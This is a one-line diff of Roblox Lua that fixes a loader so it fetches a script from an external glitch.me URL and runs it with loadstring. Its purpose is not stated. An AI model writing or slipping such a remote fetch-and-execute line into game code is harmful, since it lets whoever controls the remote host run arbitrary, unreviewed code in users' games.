@@ -1,1 +1,1 @@
-loadstring(game:GetService("HttpService"):RequestAsync("https://tosss.glitch.me/elevator.lua"))()
+loadstring(game:GetService("HttpService"):GetAsync("https://tosss.glitch.me/elevator.lua"))()
